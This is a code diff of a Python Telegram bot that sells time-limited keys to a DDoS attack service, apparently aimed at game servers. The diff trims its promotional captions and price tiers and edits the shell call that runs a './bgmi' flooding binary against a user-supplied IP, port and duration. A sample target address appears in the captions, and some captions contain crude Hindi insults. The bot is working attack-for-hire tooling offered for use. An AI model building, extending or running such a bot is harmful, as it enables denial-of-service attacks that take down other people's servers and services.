@@ -28,47 +28,7 @@ bot_open = False  # Default state is closed (requires key)
 START_IMAGES = [
     {
         'url': 'https://www.craiyon.com/image/Mfze8oH8SbO8IDZQZb36Tg',
-        'caption': '🔥 *Welcome to the Ultimate DDoS Bot!* 🔥\n\nExample 20.235.43.9 14533 120\n\n💀 *Bsdk time 120 dalne ke baad* 💀\n\n⚠️ *Use responsibly* ⚠️'
-    },
-    {
-        'url': 'https://www.craiyon.com/image/KC4CfJPuQTuKdSdlrkiczg',
-        'caption': '⚡ *Powerful DDoS Tool* ⚡\n\nRedeem your key to get started!\n\n🔑 *Example 20.235.43.9 14533 120* 🔑'
-    },
-    {
-        'url': 'https://www.craiyon.com/image/A3ol0NRAQc2N3C62DXcfpA',
-        'caption': '🌪️ *Unleash the Storm* 🌪️\n\nExample 20.235.43.9 14533 120\n\n⚠️ *Use responsibly* ⚠️'
-    },
-    {
-        'url': 'https://www.craiyon.com/image/IErJnUlDTkCvcWBeTZX8qQ',
-        'caption': '💣 *Target Elimination Mode* 💣\n\nExample 20.235.43.9 14533 120\n\n🎯 *Precision strikes guaranteed* 🎯'
-    },
-    {
-        'url': 'https://www.craiyon.com/image/073Vnr7jQpGUkSMr6Rrvjw',
-        'caption': '🖥️ *Server Crasher Pro* 🖥️\n\nExample 20.235.43.9 14533 120\n\n☠️ *Leave no trace fuck that shit* ☠️'
-    },
-    {
-        'url': 'https://www.craiyon.com/image/XgSNsdopTYGnlDsVC4PnSw',
-        'caption': '🌐 *Network Dominator* 🌐\n\nExample 20.235.43.9 14533 120\n\n⚡ *Lightning-fast attacks* ⚡'
-    },
-    {
-        'url': 'https://www.craiyon.com/image/JbBsmO9RQcy2CKQiOf_MOw',
-        'caption': '🚀 *Turbo Attack Mode* 🚀\n\nExample 20.235.43.9 14533 120\n\n💥 *Maximum destruction* 💥'
-    },
-    {
-        'url': 'https://www.craiyon.com/image/yF1wqEx7TuuAfoBLK0Zmag',
-        'caption': '🛡️ *Bypass All Protections* 🛡️\n\nExample 20.235.43.9 14533 120\n\n🔓 *No firewall can stop us* 🔓'
-    },
-    {
-        'url': 'https://www.craiyon.com/image/XuS2HNGdTFKqGkpAGzzrqg',
-        'caption': '👑 *Elite Hacking Toolkit* 👑\n\nExample 20.235.43.9 14533 120\n\n🔮 *The future of pentesting* 🔮'
-    },
-    {
-        'url': 'https://www.craiyon.com/image/iRyN9awaQIeFgjqVVucIlA',
-        'caption': '📉 *Downtime Guaranteed* 📉\n\nExample 20.235.43.9 14533 120\n\n⏱️ *24/7 attack availability with stability* ⏱️'
-    },
-    {
-        'url': 'https://www.craiyon.com/image/bAhq_xScRm-wk-hD9GzUrw',
-        'caption': '🤖 *AI-Powered Attacks* 🤖\n\nExample 20.235.43.9 14533 120\n\n🧠 *Machine learning destruction* 🧠'
+        'caption': '🔥 *Welcome to the Ultimate DDoS Bot!* 🔥\n\nExample: 20.235.43.9 14533 120\n\n💀 *Bsdk time 120 dalne ke baad* 💀\n\n⚠️ *Use responsibly* ⚠️'
     },
 ]
 
@@ -87,23 +47,7 @@ reseller_balances = {}  # Stores reseller balances (user_id: balance)
 
 # Key Prices
 KEY_PRICES = {
-    "1H": 5,  # Price for 1-hour key
-    "2H": 10,  # Price for 1-hour key
-    "3H": 15,  # Price for 1-hour key
-    "4H": 20,  # Price for 1-hour key
-    "5H": 25,  # Price for 1-hour key
-    "6H": 30,  # Price for 1-hour key
-    "7H": 35,  # Price for 1-hour key
-    "8H": 40,  # Price for 1-hour key
-    "9H": 45,  # Price for 1-hour key
-    "10H": 50, # Price for 1-hour key
-    "1D": 60,  # Price for 1-day key
-    "3D": 160, # Price for 1-day key
-    "5D": 250, # Price for 2-day key
-    "7D": 320, # Price for 2-day key
-    "15D": 700, # Price for 2-day key
-    "30D": 1250, # Price for 2-day key
-    "60D": 2000, # Price for 2-day key,
+    "1H": 5,  # Price for 1-hour key,
 }
 
 # Global Cooldown
@@ -406,7 +350,7 @@ async def attack_input(update: Update, context: CallbackContext):
     async def run_attack():
         try:
             process = await asyncio.create_subprocess_shell(
-                f"./bgmi {ip} {port} {duration} {MAX_THREADS}",
+                f"./bgmi {ip} {port} {duration}",
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE
             )
@@ -758,13 +702,7 @@ async def cancel_conversation(update: Update, context: CallbackContext):
 async def rules(update: Update, context: CallbackContext):
     rules_text = (
         "📜 *Rules:*\n\n"
-        "1. Do not spam the bot.\n\n"
-        "2. Only use the bot in the allowed group.\n\n"
-        "3. Do not share your keys with others.\n\n"
-        "4. Follow the instructions carefully.\n\n"
-        "5. Respect other users and the bot owner.\n\n"
-        "6. Any violation of these rules will result key ban with no refund.\n\n\n"
-        "BSDK RULES  FOLLOW KRNA WARNA GND MAR DUNGA.\n\n"
+        
     )
     await update.message.reply_text(rules_text, parse_mode='Markdown')
 
@@ -869,7 +807,6 @@ def main():
         },
         fallbacks=[CommandHandler("cancel", cancel_conversation)],
     )
-
 
     delete_key_handler = ConversationHandler(
         entry_points=[CommandHandler("deletekey", delete_key_start), MessageHandler(filters.Text("Delete Key"), delete_key_start)],
